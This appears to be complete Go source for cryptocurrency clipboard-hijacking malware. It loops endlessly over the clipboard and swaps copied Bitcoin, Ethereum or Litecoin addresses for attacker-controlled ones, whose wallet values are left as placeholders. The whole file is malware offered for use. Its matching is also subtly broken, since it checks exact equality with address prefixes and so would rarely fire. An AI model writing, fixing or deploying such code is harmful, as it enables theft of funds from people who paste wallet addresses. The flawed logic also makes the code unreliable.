package main

import (
	"github.com/atotto/clipboard"
	"log"
)

func main() {
	for {
		BTC := "bitcoin address here"
		ETH := "Etherium address here"
		LTC := "litecoin address here"
		ltcfmt := "ltc1"
		ethfmt := "0x"
		btcfmt := "bc1"
		content, err := clipboard.ReadAll()

		if err != nil {
			log.Fatal(err)
		}

		if content == btcfmt {
			clipboard.WriteAll(BTC)
		}
		if content == ethfmt {
			clipboard.WriteAll(ETH)
		}
		if content == ltcfmt {
			clipboard.WriteAll(LTC)
		}
	}
}
